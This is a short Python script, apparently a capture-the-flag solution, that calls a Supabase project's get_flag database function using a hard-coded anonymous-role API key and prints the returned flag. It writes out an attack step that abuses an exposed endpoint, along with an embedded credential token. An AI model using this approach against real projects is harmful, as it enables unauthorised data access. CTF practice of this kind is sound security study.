import requests

url = "https://bpmyujqesbysrbbqjdcb.supabase.co"

headers = {
    'Apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJwbXl1anFlc2J5c3JiYnFqZGNiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUyODcxODUsImV4cCI6MjA4MDg2MzE4NX0.xzmN7tAV9Tq0hLVp66uiIiWFk_dZlv92n0_V1qQXA0o'
}

res = requests.get(f'{url}/rest/v1/rpc/get_flag', headers=headers)
print("Flag:", res.json())